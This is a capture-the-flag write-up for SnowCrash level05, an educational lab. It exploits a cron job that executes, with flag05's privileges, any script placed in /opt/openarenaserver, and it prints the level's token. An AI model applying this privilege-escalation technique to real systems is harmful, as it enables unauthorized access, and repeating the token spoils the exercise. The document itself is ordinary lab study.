# SnowCrash - Level05

## Objective

Find the password for the next level by logging into the `flag05` account.

## Steps

### 1. Locate files needed for the challenge
```bash
ls 
```
Nothing

List all files owned by the `flag05` account.
```bash
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This tells us this file is probably ran periodically, runs all files in /opt/openarenaserver/ and executes them with bash, adds a time limit of 5 seconds per script (cant be too complicated)

Let's just drop out script in the directory and check if if gets removed (means it got executed)

```bash
#!/bin/sh
/bin/getflag > /tmp/flag05
```

After one minute it got removed which confirms the script is a cronjob that gets executed every 30 seconds or every minute

```bash
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
